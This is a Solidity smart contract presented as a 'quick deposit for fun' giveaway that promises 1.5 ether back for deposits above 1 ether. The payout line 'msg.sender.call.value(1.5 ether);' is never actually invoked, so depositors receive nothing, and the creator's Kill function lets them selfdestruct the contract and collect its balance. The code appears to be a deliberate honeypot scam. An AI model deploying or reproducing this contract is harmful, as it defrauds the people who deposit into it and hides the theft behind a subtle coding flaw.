1 pragma solidity ^0.4.19;
2 
3 contract QUICK_DEPOSIT_FOR_FUN    
4 {
5     address creator = msg.sender;
6     uint256 public LastExtractTime;
7     mapping (address=>uint256) public ExtractDepositTime;
8     uint256 public freeEther;
9     
10     function Deposit()
11     public
12     payable
13     {
14         if(msg.value> 1 ether && freeEther >= 0.5 ether)
15         {
16             LastExtractTime = now + 1 days;
17             ExtractDepositTime[msg.sender] = LastExtractTime;
18             freeEther-=0.5 ether;
19         }
20     }
21     
22     function GetFreeEther()
23     public
24     payable
25     {
26         if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now)
27         {
28             msg.sender.call.value(1.5 ether);
29             ExtractDepositTime[msg.sender] = 0;
30         }
31     }
32     
33     function PutFreeEther()
34     public
35     payable
36     {
37         uint256 newVal = freeEther+msg.value;
38         if(newVal>freeEther)freeEther=newVal;
39     }
40     
41     function Kill()
42     public
43     payable
44     {
45         if(msg.sender==creator && now>LastExtractTime + 2 days)
46         {
47             selfdestruct(creator);
48         }
49         else revert();
50     }
51     
52     function() public payable{}
53 }